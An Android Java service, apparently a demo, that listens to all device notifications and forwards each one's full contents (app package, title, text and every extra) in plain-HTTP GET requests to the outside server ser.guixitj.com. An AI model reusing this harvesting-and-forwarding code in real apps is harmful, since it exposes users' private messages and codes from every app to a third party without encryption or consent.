package com.ashun.demo;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

@SuppressLint("NewApi")
public class ListenService extends NotificationListenerService {


    // 在收到消息时触发
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // TODO Auto-generated method stub
        Bundle extras = sbn.getNotification().extras;
        // 获取接收消息APP的包名
        String notificationPkg = sbn.getPackageName();
        // 获取接收消息的抬头
        String notificationTitle = extras.getString(Notification.EXTRA_TITLE);
        // 获取接收消息的内容
        String notificationText = extras.getString(Notification.EXTRA_TEXT);

        JSONObject o = new JSONObject();
        for(String key:extras.keySet()){
            try {
                o.put(key,extras.get(key));
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        Log.i("XSL_Test", "Notification posted " + notificationTitle + " & " + notificationText);

        Toast.makeText(this, "Notification posted " + notificationTitle + " & " + notificationText, Toast.LENGTH_SHORT).show();


       postData(o.toString(),notificationPkg,notificationTitle,notificationText);
    }

    // 在删除消息时触发
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // TODO Auto-generated method stub
        Bundle extras = sbn.getNotification().extras;
        // 获取接收消息APP的包名
        String notificationPkg = sbn.getPackageName();
        // 获取接收消息的抬头
        String notificationTitle = extras.getString(Notification.EXTRA_TITLE);
        // 获取接收消息的内容
        String notificationText = extras.getString(Notification.EXTRA_TEXT);
        Log.i("XSL_Test", "Notification removed " + notificationTitle + " & " + notificationText);

        Toast.makeText(this, "delete-Notification posted " + notificationTitle + " & " + notificationText, Toast.LENGTH_SHORT).show();

    }

    /**
     *
     * 提交数据到服务器
     * @param title  通知的标题
     * @param text  通知的内容
     */
    private void postData(String all,String pkg,String title,String text){
        OkHttpClient client = new OkHttpClient();


        Request request = new Request.Builder().url(String.format("http://ser.guixitj.com/notice/service?all=%s&pkg=%s&title=%s&text=%s&time=%s", all, pkg, title, text,""+System.currentTimeMillis()))
                .get()
                .build();

        Call call = client.newCall(request);
        call.enqueue(new Callback(){

            @Override
            public void onFailure(Call call, IOException e) {

            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if(response.code()==200){

                }
            }
        });

    }
}
